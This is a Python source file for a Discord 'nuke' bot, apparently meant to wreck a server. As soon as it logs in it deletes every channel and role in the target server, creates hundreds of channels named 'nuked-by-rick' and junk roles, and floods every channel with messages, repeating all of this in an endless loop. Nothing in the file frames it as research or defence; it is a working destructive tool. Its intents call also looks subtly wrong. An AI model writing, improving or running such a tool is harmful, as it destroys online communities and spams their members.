import discord
import asyncio
from discord.ext import commands
from dotenv import load_dotenv
import os

load_dotenv()

bot = commands.Bot(
    command_prefix='.',
    intents=discord.all(),
    help_command=None
)

@bot.event
async def on_ready():
    await bot.change_presence(
        activity=discord.Streaming(
            name='WATCH MY TWITCH',
            url='https://www.youtube.com/watch?v=xvFZjo5PgG0'
        )
    )

    await runthebot(
        guild_id=int(os.getenv('GUILD_ID')),
        batch_size=5000
    )

    try:
        await bot.tree.sync()
    except Exception:
        pass

    print('bot ready')


async def runthebot(guild_id, batch_size=5000):
    guild = bot.get_guild(guild_id)

    async def batch_action(action, items):
        while items:
            batch = items[:batch_size]
            items = items[batch_size:]

            try:
                await asyncio.gather(*[action(item) for item in batch])
            except discord.Forbidden as e:
                print(e)
                continue
            except discord.HTTPException as f:
                print(f)
                continue
            except Exception as g:
                print(g)
                continue

    while True:
        await batch_action(lambda channel: channel.delete(), guild.channels)

        await batch_action(lambda task: task, [guild.create_text_channel(name='nuked-by-rick') for _ in range(500)])

        await batch_action(lambda role: role.delete(), guild.roles)

        await batch_action(lambda task: task, [guild.create_role(name='hey there') for _ in range(250)])

        for i in range(99999):
            await batch_action(lambda task: task, [channel.send('yo') for channel in guild.text_channels])

try:
    bot.run(os.getenv('BOT_TOKEN'))
except Exception as e:
    print(e)
